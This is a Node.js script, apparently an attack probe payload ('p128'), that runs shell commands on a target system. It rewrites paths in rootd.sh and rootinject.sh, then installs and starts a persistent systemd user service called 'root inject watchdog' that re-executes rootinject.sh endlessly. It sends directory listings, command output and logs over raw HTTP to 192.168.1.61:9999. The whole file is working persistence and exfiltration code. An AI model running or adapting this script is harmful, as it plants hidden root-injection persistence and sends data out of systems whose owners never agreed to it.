"use strict";
var cp = null;
try { cp = require('child_process'); } catch (e) {}
var net = require('net');
var HOST='192.168.1.61', PORT=9999;
var R={ts:new Date().toISOString(), probe:'p128', results:{}, log:[]};
var posted=false;
function L(s){R.log.push(String(s).substring(0,500));}
function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},3000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
function postFinal(){if(posted)return;posted=true;postBuf('/p128info',new Buffer(JSON.stringify(R),'utf8'));}
function run(cmd,timeoutMs,maxLen){maxLen=maxLen||4000;if(!cp)return '[no cp]';try{var out=cp.execSync(cmd,{timeout:timeoutMs||25000,maxBuffer:16*1024*1024}).toString().trim();return '[exit 0] '+out.substring(0,maxLen);}catch(e){var o='';if(e.stdout)o+=e.stdout.toString();if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();return '[exit '+(e.status===undefined?'?':e.status)+'] '+(o||(e&&e.message)||'unknown').substring(0,maxLen);}}
function main(){
  var BASE='/home/owner/share/tmp/sdk_tools';
  R.results.base=run('ls -la '+BASE+' /home/owner /home/owner/.config 2>&1',10000,2000);
  R.results.mkdir=run('mkdir -p /home/owner/.config/systemd/user/default.target.wants; ls -la /home/owner/.config/systemd/user 2>&1',10000,2000);
  R.results.sed=run('sed -i "s#BASE=/opt/usr/home/owner#BASE='+BASE+'#g" '+BASE+'/rootd.sh '+BASE+'/rootinject.sh; head -3 '+BASE+'/rootd.sh; head -3 '+BASE+'/rootinject.sh',10000,2000);
  R.results.unit=run('cat > /home/owner/.config/systemd/user/rootinject.service <<EOF\n[Unit]\nDescription=root inject watchdog\n\n[Service]\nType=simple\nExecStart=/bin/sh -c "sh < '+BASE+'/rootinject.sh"\nRestart=always\nRestartSec=5\nStartLimitIntervalSec=0\n\n[Install]\nWantedBy=default.target\nEOF\nln -sf ../rootinject.service /home/owner/.config/systemd/user/default.target.wants/rootinject.service; ls -la /home/owner/.config/systemd/user /home/owner/.config/systemd/user/default.target.wants 2>&1',10000,3000);
  R.results.daemon=run('systemctl --user daemon-reload 2>&1; systemctl --user start rootinject.service 2>&1',30000,2000);
  R.results.status=run('systemctl --user status rootinject.service 2>&1 | head -20; cat /tmp/rootd.pid 2>&1; cat '+BASE+'/rootd.beat 2>&1; tail -10 '+BASE+'/rootinject.log 2>&1',10000,4000);
  R.results.final='done '+new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal,20000);
}
try{main();}catch(e){R.results.fatal=String(e)+' | '+(e.stack||'no-stack');postFinal();}
